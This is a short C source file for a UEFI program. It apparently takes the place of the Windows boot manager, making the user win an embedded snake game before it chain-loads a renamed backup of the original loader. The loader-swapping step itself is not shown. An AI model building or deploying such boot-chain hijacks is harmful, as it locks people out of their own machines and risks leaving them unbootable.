#undef __STDC_VERSION__
#include <efi.h>   
#include <uefi.h>  

#include "bootlib.h"
#include "ui.h"
#include "snake_payload.h"

char *OriginalLoader = "\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
char *BackupLoader   = "\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";

int main(int argc, char **argv) {
    BOOLEAN won = FALSE;
    displayWelcome();
    while(!won){
        if(runEmbeddedSnake(IM) == 0)
            won = TRUE;
    }
    displaySucces();
    bootFile(IM, BackupLoader);

    
    return 0;
}

